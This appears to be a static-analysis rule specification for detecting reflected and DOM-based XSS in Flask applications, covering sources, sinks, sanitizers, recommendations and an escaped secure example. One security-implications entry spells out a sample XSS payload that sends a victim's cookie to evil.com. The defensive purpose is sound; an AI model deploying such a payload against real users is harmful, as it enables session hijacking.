# Content
description: |
  This rule detects reflected XSS in Flask applications where user-controlled input
  from HTTP request parameters flows to make_response() or jsonify() without
  sanitization. It covers two complementary patterns:

  - make_response() with HTML content: When user input is embedded in a response body
    and the response is served with a text/html Content-Type, the browser renders and
    executes any HTML/JavaScript in the user-supplied content. This is the classic
    reflected XSS pattern through the raw response API.

  - jsonify() with reflected data: When user-supplied string values are included in a
    JSON response, the risk depends on how the response is consumed. If another part
    of the application takes this JSON and inserts its values into the DOM without
    encoding (a common SPA pattern), the XSS occurs in the consuming client. Additionally,
    if the response is served without the correct application/json Content-Type, some
    browsers may interpret it as HTML.

  This rule complements PYTHON-FLASK-SEC-008 (make_response specifically) with a broader
  scope that also catches jsonify() patterns. The taint analysis traces user input from
  Flask request sources through string operations and function calls to these response
  functions at argument position 0. Flows through html.escape(), markupsafe.escape(),
  Markup.escape(), or bleach.clean() are recognized as sanitizers.

message: "User input flows to response without sanitization. Escape HTML with markupsafe.escape() and verify Content-Type headers prevent browser HTML rendering."

security_implications:
  - title: Reflected XSS via Direct HTML in make_response
    description: |
      User input embedded in make_response() HTML content executes in the victim's browser
      when they visit the endpoint with a crafted URL. The attacker sends a link like
      /search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>
      to the victim. The Flask endpoint reflects the unescaped script tag, which the
      browser executes, sending the victim's session cookie to the attacker.
  - title: DOM-Based XSS via JSON Response Values
    description: |
      When a Flask API returns user input in a JSON response and frontend JavaScript
      inserts that value into the DOM using innerHTML or document.write, XSS occurs
      in the browser. For example: element.innerHTML = response.data.name. An attacker
      who controls the name parameter injects HTML via the JSON response body, which
      the frontend then writes to the DOM without encoding.
  - title: JSON-Based XSS via Content-Type Mismatch
    description: |
      If jsonify() is used but the response's Content-Type is overridden to text/html
      (or omitted in an older Flask version), browsers render the JSON as HTML.
      Object keys and string values containing <script> tags execute as JavaScript.
      This is a less common pattern but occurs when developers override Flask's default
      Content-Type on jsonify() responses.
  - title: Stored XSS via Persisted and Re-Reflected Values
    description: |
      If the user-supplied value is stored in a database and later retrieved and
      included in a response without escaping, stored XSS occurs. Every user who
      receives the response containing the stored payload is attacked. The taint
      analysis traces stored-then-retrieved flows when the data flow passes through
      recognized storage/retrieval patterns.

secure_example: |
  from flask import Flask, request, make_response, jsonify
  from markupsafe import escape
  import html

  app = Flask(__name__)

  @app.route('/greet')
  def greet():
      name = request.args.get('name', '')
      # SAFE: escape() converts <, >, &, ", ' to HTML entities
      safe_name = escape(name)
      response = make_response(f'<html><body><p>Hello, {safe_name}!</p></body></html>')
      response.headers['Content-Type'] = 'text/html; charset=utf-8'
      return response

  @app.route('/api/user')
  def get_user():
      username = request.args.get('username', '')
      # SAFE: jsonify() sets Content-Type: application/json automatically
      # String values in JSON do not execute as HTML/JS when Content-Type is correct
      return jsonify({'username': username, 'status': 'ok'})

  @app.route('/api/search')
  def search():
      query = request.args.get('q', '')
      # SAFE for HTML contexts: html.escape() encodes special characters
      safe_query = html.escape(query)
      # Use the escaped version in HTML contexts; raw value is fine in JSON
      return jsonify({'query': query, 'html_query': safe_query})

recommendations:
  - Apply markupsafe.escape() or html.escape() to every user-supplied string before inserting it into HTML content in make_response() responses.
  - Use jsonify() for JSON API responses rather than make_response() with manually constructed JSON strings -- jsonify() sets the correct application/json Content-Type automatically.
  - Never override the Content-Type of a jsonify() response to text/html -- this causes browsers to render JSON as HTML and execute any embedded script tags.
  - Instruct frontend JavaScript to use textContent instead of innerHTML when inserting API response values into the DOM -- textContent treats the value as plain text and does not execute HTML.
  - Add a Content-Security-Policy header to limit the impact of any XSS that bypasses output encoding.

detection_scope: |
  Scope: global (cross-file taint tracking across the entire project).

  Sources: Flask HTTP input methods -- request.args.get(), request.form.get(),
  request.values.get() -- which can deliver attacker-controlled strings containing
  HTML and JavaScript payloads.

  Sinks: make_response() and jsonify(). The .tracks(0) parameter targets argument
  position 0: the response body for make_response(), and the first positional data
  argument for jsonify(). The HTTP status code and headers arguments at other
  positions are not tracked.

  Sanitizers: escape(), markupsafe.escape(), Markup.escape(), html.escape(), and
  bleach.clean() are recognized as sanitizers for HTML contexts. A user input value
  that passes through any of these before reaching the response function is treated
  as safe from HTML injection. For jsonify(), the risk is lower when Content-Type
  is application/json, but the rule flags unsanitized flows to both sinks to catch
  DOM-based XSS scenarios where JSON values are later inserted into the DOM.

  The rule follows tainted strings through f-string interpolation, concatenation,
  and cross-file function calls to the response construction functions.

